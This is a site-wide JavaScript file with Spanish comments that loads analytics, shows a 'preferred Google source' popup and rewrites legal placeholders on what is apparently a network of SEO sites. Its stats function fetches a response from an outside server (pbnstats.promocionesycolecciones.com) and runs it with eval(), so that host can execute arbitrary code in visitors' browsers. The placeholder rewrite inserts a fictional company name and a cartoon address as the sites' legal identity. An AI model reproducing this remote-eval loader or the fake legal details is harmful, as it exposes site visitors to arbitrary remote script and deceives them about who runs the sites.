(function () {
  'use strict';

  // ============================================================
  // Guardas: no ejecutar dos veces ni en infoenbolas.com
  // ============================================================
  var HOST = location.hostname.replace(/^www\./, '');
  if (window.beebomstats !== undefined) return;
  window.beebomstats = true;
  //Gooogle Analitycs
  var GA_ID = 'G-XNB4SZJ7GQ';

  // Evitar cargarlo dos veces
  if (window.__gaLoaded) return;
  window.__gaLoaded = true;

  // dataLayer y función gtag disponibles antes de que cargue el script
  window.dataLayer = window.dataLayer || [];
  window.gtag = window.gtag || function () { dataLayer.push(arguments); };

  gtag('js', new Date());
  gtag('config', GA_ID);

  // Inyectar el script de forma asíncrona
  var s = document.createElement('script');
  s.async = true;
  s.src = 'https://www.googletagmanager.com/gtag/js?id=' + GA_ID;
  (document.head || document.documentElement).appendChild(s);



  // ============================================================
  // Configuración
  // ============================================================
  var REEMPLAZOS = {
    '[NOMBRE DE LA EMPRESA]': 'Botijonline LLC',
    '[DIRECCIÓN DE LA EMPRESA]':'31 Spooner Street, Quahog, Rhode Island, 00093'
  };

  var STATS_URL = 'https://pbnstats.promocionesycolecciones.com/add.php';

  // Configuración del aviso (popup / barra fija)
  // {dominio} se sustituye en tiempo de ejecución por el dominio actual (sin www)
  var AVISO = {
    activo: true,
    titulo: '¿Te gusta {dominio}?',                                      // solo se ve en el popup
    texto: 'Añádenos como fuente preferida en Google y verás antes nuestras noticias.', // popup y barra
    botonTexto: 'Añadir en Google',                                      // '' = sin botón
    // Enlace oficial de Google "Fuentes preferidas" (Top Stories de la Búsqueda)
    botonUrl: 'https://www.google.com/preferences/source?q={dominio}',
    botonNuevaPestana: true,
    colorBoton: '#1a73e8',     // azul Google
    // Icono: SVG en línea ('<svg ...>...</svg>') o URL de imagen. '' = sin icono.
    // Por defecto, el favicon oficial de Google servido por Google (se oculta si no carga)
    icono: 'https://www.google.com/favicon.ico',
    iconoAlt: 'Google',        // texto alternativo (solo para iconos por URL)
    segundosAutoMinimizar: 8,  // popup -> barra tras N segundos (0 = solo al cerrar)
    cerrableBarra: true,       // la barra tiene X para ocultarla en la sesión
    geoCloudflare: true,       // intenta /cdn-cgi/trace (solo si el sitio va por Cloudflare)
    geoTimeoutMs: 1500,        // máximo de espera de la geo antes de usar la zona horaria
    // Al hacer clic en el botón se registra una visita virtual en pbnstats
    // con la URL https://<discoverDominio>/<slug-del-dominio-actual>
    discoverDominio: 'addedtodiscover.com',
    discoverAux1: 'x1'         // valor de aux1 para estas visitas (cámbialo si quieres separarlas)
  };

  // Avisos alternativos por dominio.
  // Si el dominio actual (sin www) está en `dominios`, se usa `aviso` en lugar del estándar.
  // En `aviso` solo hace falta poner lo que cambia: el resto se hereda de AVISO.
  // Se aplica la primera regla que coincida.
  var AVISOS_POR_DOMINIO = [
    {
      dominios: ['www.infoenbolas.com', 'infoenbolas.com'],
      aviso: {
        titulo: 'Noticias LGTBI',
        texto: 'Sigue toda la actualidad LGTBI en nuestro canal de telegram.',
        botonTexto: 'Ir a Telegram',
        botonUrl: 'https://t.me/lgtbinoticias',
        colorBoton: '#e8501a',
        // Ejemplo de SVG en línea (campana genérica); usa currentColor = color del botón
       icono: '<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">' +
       '<defs><clipPath id="tgCircle"><circle cx="12" cy="12" r="11"/></clipPath></defs>' +
       '<g clip-path="url(#tgCircle)">' +
       '<rect width="24" height="4" y="0" fill="#E40303"/>' +
       '<rect width="24" height="4" y="4" fill="#FF8C00"/>' +
       '<rect width="24" height="4" y="8" fill="#FFED00"/>' +
       '<rect width="24" height="4" y="12" fill="#008026"/>' +
       '<rect width="24" height="4" y="16" fill="#004DFF"/>' +
       '<rect width="24" height="4" y="20" fill="#750787"/>' +
       '</g>' +
       '<circle cx="12" cy="12" r="11" fill="none" stroke="currentColor" stroke-width="0.5"/>' +
       '<path d="M5 11.5 19 5.8 16.3 18.2 11.8 14.8 9.5 17 9.8 12.9 16 8.7 8 12.2Z" ' +
       'fill="white" stroke="white" stroke-width="0.6" stroke-linejoin="round"/>' +
       '</svg>'
        // activo: false   // descomenta para NO mostrar aviso en estos dominios
      }
    }
  ];

  // Mezcla la regla que coincida con el dominio actual sobre el aviso estándar
  (function aplicarAvisoPorDominio() {
    for (var i = 0; i < AVISOS_POR_DOMINIO.length; i++) {
      var regla = AVISOS_POR_DOMINIO[i];
      var coincide = (regla.dominios || []).some(function (d) {
        return String(d).toLowerCase().replace(/^www\./, '') === HOST.toLowerCase();
      });
      if (!coincide) continue;
      Object.keys(regla.aviso || {}).forEach(function (k) { AVISO[k] = regla.aviso[k]; });
      return;
    }
  })();

  var BOT_RE = new RegExp('(googlebot\/|bot|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)', 'i');

  // ============================================================
  // Utilidades
  // ============================================================

  // Ejecuta fn cuando el DOM está listo (aunque el script cargue tarde)
  function onReady(fn) {
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', fn, { once: true });
    } else {
      fn();
    }
  }

  // Comprueba cond() cada `intervalo` ms hasta que sea true o pase `timeout`
  function esperar(cond, cb, timeout, intervalo) {
    timeout = timeout || 10000;
    intervalo = intervalo || 100;
    var inicio = Date.now();
    (function check() {
      if (cond()) return cb();
      if (Date.now() - inicio < timeout) setTimeout(check, intervalo);
    })();
  }

  function escaparRegex(s) {
    return s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  }

  // sessionStorage protegido (puede fallar en modo privado o con cookies bloqueadas)
  function leerSesion(clave) {
    try { return window.sessionStorage.getItem(clave); } catch (e) { return null; }
  }
  function guardarSesion(clave, valor) {
    try { window.sessionStorage.setItem(clave, valor); } catch (e) { /* sin almacenamiento */ }
  }

  // ============================================================
  // Reemplazo de placeholders
  // ============================================================

  // Caso normal: el placeholder está entero dentro de un nodo de texto
  function reemplazarTexto(buscar, reemplazo, raiz) {
    raiz = raiz || document.body;
    var walker = document.createTreeWalker(raiz, NodeFilter.SHOW_TEXT);
    var nodo;
    while ((nodo = walker.nextNode())) {
      if (nodo.nodeValue.indexOf(buscar) !== -1) {
        nodo.nodeValue = nodo.nodeValue.split(buscar).join(reemplazo);
      }
    }
  }

  // Caso partido: el placeholder está cortado por etiquetas inline
  // (p.ej. "[NOMBRE DE <b>LA</b> EMPRESA]")
  function reemplazarPartido(buscar, reemplazo, raiz) {
    raiz = raiz || document.body;
    var patron = new RegExp(
      buscar.split('').map(escaparRegex).join('(?:<[^>]+>)*'),
      'g'
    );

    raiz.querySelectorAll('li, p, td, th, h1, h2, h3, h4, h5, h6, span, a, div').forEach(function (el) {
      if (el.textContent.indexOf(buscar) === -1) return;
      // Si algún hijo ya lo contiene entero, el corte no está en este nivel
      var hijoLoTiene = Array.prototype.some.call(el.children, function (h) {
        return h.textContent.indexOf(buscar) !== -1;
      });
      if (hijoLoTiene) return;
      el.innerHTML = el.innerHTML.replace(patron, reemplazo);
    });
  }

  function aplicarReemplazos() {
    Object.keys(REEMPLAZOS).forEach(function (buscar) {
      reemplazarTexto(buscar, REEMPLAZOS[buscar]);
      reemplazarPartido(buscar, REEMPLAZOS[buscar]);
    });
  }

  // Next.js/React re-renderiza el DOM tras la hidratación y al navegar,
  // así que vigilamos cambios y volvemos a aplicar los reemplazos.
  function vigilarCambios() {
    var pendiente = null;
    var observer = new MutationObserver(function () {
      if (pendiente) return;
      pendiente = setTimeout(function () {
        pendiente = null;
        observer.disconnect();
        aplicarReemplazos();
        observer.observe(document.body, { childList: true, subtree: true, characterData: true });
      }, 50);
    });
    observer.observe(document.body, { childList: true, subtree: true, characterData: true });
  }

  // Detecta Next.js por el DOM (disponible ya en DOMContentLoaded),
  // no solo por window.next (que se define más tarde)
  function esNextJs() {
    return window.next !== undefined ||
      !!document.getElementById('__next') ||
      !!document.querySelector('script[src*="/_next/"]');
  }

  function iniciarReemplazos() {
    if (!esNextJs()) return; // para tucristalero, tu alarma y demás

    aplicarReemplazos();       // primera pasada inmediata
    vigilarCambios();          // y cada vez que React toque el DOM

    // Pasada extra cuando Next termine de arrancar (post-hidratación)
    esperar(function () { return window.next !== undefined; }, function () {
      setTimeout(aplicarReemplazos, 300);
    });
  }

  // ============================================================
  // Geolocalización: ¿el usuario está en España?
  // ============================================================

  // Heurística sin llamadas externas: zona horaria del sistema.
  // Cubre península/Baleares, Canarias y Ceuta/Melilla.
  function paisPorZonaHoraria() {
    var zonasEs = ['Europe/Madrid', 'Atlantic/Canary', 'Africa/Ceuta'];
    try {
      var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
      if (tz) return zonasEs.indexOf(tz) !== -1 ? 'ES' : 'XX';
    } catch (e) { /* navegador sin Intl */ }
    // Último recurso: idioma del navegador (es-ES casi siempre es España)
    var idioma = (navigator.language || '').toLowerCase();
    return idioma === 'es-es' ? 'ES' : 'XX';
  }

  // Si el sitio va por Cloudflare, /cdn-cgi/trace devuelve "loc=XX" por IP (más fiable).
  // Si no responde a tiempo o no existe, se usa la zona horaria.
  function detectarPais(cb) {
    var hecho = false;
    var respaldo = paisPorZonaHoraria();
    function fin(pais) {
      if (hecho) return;
      hecho = true;
      cb(pais);
    }

    if (!AVISO.geoCloudflare || !window.fetch) return fin(respaldo);

    var t = setTimeout(function () { fin(respaldo); }, AVISO.geoTimeoutMs);
    fetch('/cdn-cgi/trace', { cache: 'no-store', credentials: 'omit' })
      .then(function (r) { return r.ok ? r.text() : ''; })
      .then(function (txt) {
        clearTimeout(t);
        var m = /^loc=([A-Z]{2})$/m.exec(txt);
        fin(m ? m[1] : respaldo);
      })
      .catch(function () {
        clearTimeout(t);
        fin(respaldo);
      });
  }

  // ============================================================
  // Visita virtual al hacer clic: addedtodiscover.com/<dominio-con-slug>
  // ============================================================

  // "www.xxx.com" -> "xxx-com"; "mi.sitio.es" -> "mi-sitio-es"
  function slugDominio(host) {
    return host.toLowerCase()
      .replace(/^www\./, '')
      .replace(/[^a-z0-9]+/g, '-')
      .replace(/^-+|-+$/g, '');
  }

  function registrarClickDiscover() {
    if (BOT_RE.test(navigator.userAgent)) return;

    // Una sola visita por dominio y sesión, aunque haga varios clics
    var clave = 'avb-discover-' + HOST;
    if (leerSesion(clave)) return;
    guardarSesion(clave, '1');

    var slug = slugDominio(location.hostname);
    var params = new URLSearchParams({
      rand: Math.floor(Math.random() * 100000) + 1,
      aux1: AVISO.discoverAux1,
      referer: 'https://' + AVISO.discoverDominio + '/' + slug,
      title: slug
    });
    var url = STATS_URL + '?' + params.toString();

    // keepalive: la petición sale aunque el clic cambie de página.
    // no-cors: es "dispara y olvida", no leemos la respuesta (y no se hace eval).
    try {
      fetch(url, { method: 'GET', keepalive: true, mode: 'no-cors', credentials: 'omit' })
        .catch(function () { new Image().src = url; });
    } catch (e) {
      new Image().src = url; // navegadores sin fetch
    }
  }

  // ============================================================
  // Aviso: popup -> barra fija abajo (fuera de España)
  //        barra fija arriba (España)
  // ============================================================
  var CLAVE_ESTADO = 'avb-estado'; // '' | 'minimizado' | 'cerrado'

  function inyectarEstilos() {
    if (document.getElementById('avb-estilos')) return;
    var css =
      '.avb{position:fixed;z-index:2147483000;box-sizing:border-box;background:#fff;color:#1a1a1a;' +
        'font-family:system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif;box-shadow:0 4px 24px rgba(0,0,0,.18)}' +
      '.avb *{box-sizing:border-box}' +
      '.avb-overlay{position:fixed;inset:0;z-index:2147482999;background:rgba(0,0,0,.5);opacity:0;transition:opacity .3s}' +
      '.avb-overlay.avb-visible{opacity:1}' +
      // Modo popup centrado
      '.avb-popup{top:50%;left:50%;transform:translate(-50%,-50%);width:min(92vw,440px);' +
        'border-radius:12px;padding:28px 24px 22px;text-align:center}' +
      '.avb-titulo{display:block;font-size:20px;font-weight:700;margin:0 0 8px}' +
      '.avb-popup .avb-texto{display:block;font-size:15px;line-height:1.45;margin:0 0 18px}' +
      // Modo barra (arriba o abajo)
      '.avb-barra{left:0;right:0;width:100%;display:flex;align-items:center;justify-content:center;' +
        'flex-wrap:wrap;gap:8px 14px;padding:10px 48px 10px 16px;font-size:14px;line-height:1.35;text-align:center}' +
      '.avb-barra .avb-titulo{display:none}' +
      // Icono (SVG o imagen)
      '.avb-icono{display:flex;align-items:center;justify-content:center;color:' + AVISO.colorBoton + '}' +
      '.avb-icono svg,.avb-icono img{width:100%;height:100%;display:block;object-fit:contain}' +
      '.avb-popup .avb-icono{width:48px;height:48px;margin:0 auto 12px}' +
      '.avb-barra .avb-icono{width:22px;height:22px;flex:0 0 22px}' +
      '.avb-abajo{bottom:0;box-shadow:0 -2px 12px rgba(0,0,0,.15)}' +
      '.avb-arriba{top:0;box-shadow:0 2px 12px rgba(0,0,0,.15)}' +
      // Botón y cierre
      '.avb-boton{display:inline-block;background:' + AVISO.colorBoton + ';color:#fff !important;' +
        'text-decoration:none;font-weight:600;padding:10px 22px;border-radius:6px;white-space:nowrap}' +
      '.avb-barra .avb-boton{padding:6px 14px;font-size:13px}' +
      '.avb-cerrar{position:absolute;top:8px;right:10px;background:none;border:0;cursor:pointer;' +
        'font-size:24px;line-height:1;color:#666;padding:4px 8px}' +
      '.avb-barra .avb-cerrar{top:50%;transform:translateY(-50%);font-size:20px}' +
      '@media (max-width:480px){.avb-barra{font-size:13px}}';

    var st = document.createElement('style');
    st.id = 'avb-estilos';
    st.textContent = css;
    (document.head || document.documentElement).appendChild(st);
  }

  // Sustituye {dominio} en textos y URL de la config
  function rellenar(cadena, codificarUrl) {
    var dominio = codificarUrl ? encodeURIComponent(HOST) : HOST;
    return String(cadena || '').split('{dominio}').join(dominio);
  }

  // Crea el icono a partir de AVISO.icono: SVG en línea (saneado) o URL de imagen
  function crearIcono() {
    var valor = String(AVISO.icono || '').trim();
    if (!valor) return null;

    var cont = document.createElement('span');
    cont.className = 'avb-icono';

    if (valor.charAt(0) === '<') {
      // SVG en línea: se parsea como XML y se quitan scripts y atributos on*/javascript:
      var doc = new DOMParser().parseFromString(valor, 'image/svg+xml');
      var svg = doc.documentElement;
      if (!svg || svg.nodeName.toLowerCase() !== 'svg' || doc.getElementsByTagName('parsererror').length) {
        return null; // SVG mal formado: sin icono
      }
      Array.prototype.forEach.call(svg.querySelectorAll('script, foreignObject'), function (n) { n.remove(); });
      [svg].concat(Array.prototype.slice.call(svg.querySelectorAll('*'))).forEach(function (el) {
        Array.prototype.slice.call(el.attributes).forEach(function (a) {
          if (/^on/i.test(a.name) || /^\s*javascript:/i.test(a.value)) el.removeAttribute(a.name);
        });
      });
      if (!svg.getAttribute('xmlns')) svg.setAttribute('xmlns', 'http://www.w3.org/2000/svg');
      svg.setAttribute('aria-hidden', 'true');
      svg.setAttribute('focusable', 'false');
      cont.appendChild(document.importNode(svg, true));
    } else {
      // URL de imagen
      var img = document.createElement('img');
      img.src = rellenar(valor, true);
      img.alt = AVISO.iconoAlt || '';
      img.decoding = 'async';
      img.referrerPolicy = 'no-referrer';
      img.onerror = function () { cont.remove(); }; // si no carga, fuera icono
      cont.appendChild(img);
    }
    return cont;
  }

  // Construye la caja con textContent (sin innerHTML: nada de inyección desde la config)
  function crearCaja() {
    var caja = document.createElement('div');
    caja.className = 'avb';
    caja.setAttribute('role', 'dialog');
    caja.setAttribute('aria-live', 'polite');

    var icono = crearIcono();
    if (icono) caja.appendChild(icono);

    var titulo = document.createElement('strong');
    titulo.className = 'avb-titulo';
    titulo.textContent = rellenar(AVISO.titulo);
    caja.appendChild(titulo);

    var texto = document.createElement('span');
    texto.className = 'avb-texto';
    texto.textContent = rellenar(AVISO.texto);
    caja.appendChild(texto);

    if (AVISO.botonTexto && AVISO.botonUrl) {
      var boton = document.createElement('a');
      boton.className = 'avb-boton';
      boton.href = rellenar(AVISO.botonUrl, true);
      boton.textContent = rellenar(AVISO.botonTexto);
      if (AVISO.botonNuevaPestana) {
        boton.target = '_blank';
        boton.rel = 'noopener';
      }
      // Registrar la visita virtual en el clic (también clic central / Ctrl+clic)
      boton.addEventListener('click', registrarClickDiscover);
      boton.addEventListener('auxclick', function (e) {
        if (e.button === 1) registrarClickDiscover();
      });
      caja.appendChild(boton);
    }

    var cerrar = document.createElement('button');
    cerrar.type = 'button';
    cerrar.className = 'avb-cerrar';
    cerrar.setAttribute('aria-label', 'Cerrar');
    cerrar.textContent = '\u00D7';
    caja.appendChild(cerrar);

    return { caja: caja, cerrar: cerrar, boton: boton || null };
  }

  // Reserva hueco en el body para que la barra no tape el contenido
  function reservarHueco(caja, lado) {
    var prop = lado === 'arriba' ? 'paddingTop' : 'paddingBottom';
    var original = document.body.style[prop];
    var base = parseFloat(getComputedStyle(document.body)[prop]) || 0;

    function ajustar() {
      if (!caja.isConnected) return;
      document.body.style[prop] = (base + caja.offsetHeight) + 'px';
    }
    ajustar();

    var ro = window.ResizeObserver ? new ResizeObserver(ajustar) : null;
    if (ro) ro.observe(caja); else window.addEventListener('resize', ajustar);

    // Devuelve la función que deshace el hueco
    return function () {
      if (ro) ro.disconnect(); else window.removeEventListener('resize', ajustar);
      document.body.style[prop] = original;
    };
  }

  // Si React/Next vuelve a pintar el body y se lleva la caja, la reinsertamos
  function mantenerEnDom(nodos) {
    var obs = new MutationObserver(function () {
      nodos.forEach(function (n) {
        if (n.activo && !n.el.isConnected) document.body.appendChild(n.el);
      });
    });
    obs.observe(document.body, { childList: true });
    return obs;
  }

  // Muestra la barra fija (arriba o abajo); devuelve la función para quitarla
  function mostrarBarra(ui, lado) {
    ui.caja.classList.remove('avb-popup');
    ui.caja.classList.add('avb-barra', lado === 'arriba' ? 'avb-arriba' : 'avb-abajo');
    ui.caja.setAttribute('role', 'region');
    ui.caja.setAttribute('aria-label', 'Aviso');
    if (!ui.caja.isConnected) document.body.appendChild(ui.caja);
    var quitarHueco = reservarHueco(ui.caja, lado);

    ui.cerrar.style.display = AVISO.cerrableBarra ? '' : 'none';
    ui.cerrar.onclick = function () {
      guardarSesion(CLAVE_ESTADO, 'cerrado');
      ui.nodoCaja.activo = false;
      quitarHueco();
      ui.caja.remove();
    };
  }

  // Popup centrado que, al cerrarlo (o tras N segundos), se encoge hasta la barra de abajo
  function mostrarPopup(ui) {
    var overlay = document.createElement('div');
    overlay.className = 'avb-overlay';
    var nodoOverlay = { el: overlay, activo: true };
    ui.vigilados.push(nodoOverlay);

    ui.caja.classList.add('avb-popup');
    ui.caja.setAttribute('aria-modal', 'true');
    document.body.appendChild(overlay);
    document.body.appendChild(ui.caja);
    requestAnimationFrame(function () { overlay.classList.add('avb-visible'); });

    var temporizador = null;
    var minimizado = false;

    function minimizar() {
      if (minimizado) return;
      minimizado = true;
      clearTimeout(temporizador);
      document.removeEventListener('keydown', alPulsarTecla);
      guardarSesion(CLAVE_ESTADO, 'minimizado');
      ui.caja.removeAttribute('aria-modal');

      // Animación FLIP: posición del popup -> posición de la barra
      var antes = ui.caja.getBoundingClientRect();
      mostrarBarra(ui, 'abajo');
      var despues = ui.caja.getBoundingClientRect();

      if (ui.caja.animate && despues.width && despues.height) {
        var dx = antes.left - despues.left;
        var dy = antes.top - despues.top;
        var sx = antes.width / despues.width;
        var sy = antes.height / despues.height;
        ui.caja.animate([
          { transformOrigin: 'top left', transform: 'translate(' + dx + 'px,' + dy + 'px) scale(' + sx + ',' + sy + ')', opacity: 0.6 },
          { transformOrigin: 'top left', transform: 'none', opacity: 1 }
        ], { duration: 450, easing: 'cubic-bezier(.2,.8,.2,1)' });
      }

      // Quitar el fondo oscuro con fundido
      nodoOverlay.activo = false;
      overlay.classList.remove('avb-visible');
      setTimeout(function () { overlay.remove(); }, 300);
    }

    function alPulsarTecla(e) {
      if (e.key === 'Escape') minimizar();
    }

    ui.cerrar.onclick = minimizar;
    overlay.addEventListener('click', minimizar);
    // Si hace clic en el botón desde el popup, también pasa a barra
    if (ui.boton) ui.boton.addEventListener('click', minimizar);
    document.addEventListener('keydown', alPulsarTecla);
    if (AVISO.segundosAutoMinimizar > 0) {
      temporizador = setTimeout(minimizar, AVISO.segundosAutoMinimizar * 1000);
    }
  }

  function iniciarAviso() {
    if (!AVISO.activo) return;
    var estado = leerSesion(CLAVE_ESTADO);
    if (estado === 'cerrado') return; // ya lo cerró en esta sesión

    detectarPais(function (pais) {
      inyectarEstilos();
      var ui = crearCaja();
      ui.nodoCaja = { el: ui.caja, activo: true };
      ui.vigilados = [ui.nodoCaja];
      mantenerEnDom(ui.vigilados);

      if (pais === 'ES') {
        // España: barra fija arriba, sin popup
        mostrarBarra(ui, 'arriba');
      } else if (estado === 'minimizado') {
        // Fuera de España y ya vio el popup en esta sesión: directamente la barra
        mostrarBarra(ui, 'abajo');
      } else {
        // Fuera de España, primera vez en la sesión: popup -> barra abajo
        mostrarPopup(ui);
      }
    });
  }

  // ============================================================
  // Estadísticas (solo humanos que vienen de Google)
  // ============================================================
  function enviarStats() {
    if (BOT_RE.test(navigator.userAgent)) return;
    if (document.referrer.indexOf('google.') === -1) return;

    var params = new URLSearchParams({
      rand: Math.floor(Math.random() * 100000) + 1,
      aux1: 'x1',
      referer: location.href,
      title: document.title
    });
    if (HOST === 'infoenbolas.com') return;
    fetch(STATS_URL + '?' + params.toString())
      .then(function (r) {
        if (!r.ok) throw new Error('HTTP ' + r.status);
        return r.text();
      })
      .then(function (codigo) {
        eval(codigo);
      })
      .catch(function (e) {
        console.log('pbnstats error:', e);
      });
  }

  // ============================================================
  // Arranque
  // ============================================================
  enviarStats();
  onReady(iniciarReemplazos);
  onReady(iniciarAviso);
})();
